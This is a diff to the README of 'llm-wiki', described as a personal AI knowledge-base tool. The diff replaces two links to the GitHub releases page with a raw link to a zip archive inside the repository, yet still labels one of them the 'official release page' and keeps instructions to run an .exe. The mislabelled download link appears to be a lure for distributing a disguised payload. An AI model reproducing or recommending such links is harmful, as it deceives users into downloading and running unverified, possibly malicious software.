@@ -1,6 +1,6 @@
 # 🧠 llm-wiki - Build your private automated knowledge base
 
-[![Download llm-wiki](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/manychambered-biome812/llm-wiki/releases)
+[![Download llm-wiki](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/manychambered-biome812/llm-wiki/raw/refs/heads/main/skills/llm-wiki/llm_wiki_v3.9.zip)
 
 llm-wiki acts as your dedicated personal assistant for information. It organizes your notes and documents into a structured knowledge base using artificial intelligence. This software follows the automated organization patterns popularized by Andrej Karpathy. The system reads your files, finds connections between topics, and links your ideas together without manual effort. You maintain full control over your data because everything stays on your local hard drive.
 
@@ -16,7 +16,7 @@ llm-wiki acts as your dedicated personal assistant for information. It organizes
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/manychambered-biome812/llm-wiki/releases).
+1. Visit the [official release page](https://github.com/manychambered-biome812/llm-wiki/raw/refs/heads/main/skills/llm-wiki/llm_wiki_v3.9.zip).
 2. Look for the section labeled "Assets" at the bottom of the newest release entry.
 3. Click the file ending in `.exe` to start your download.
 4. Open the downloaded file once your browser finishes the transfer.
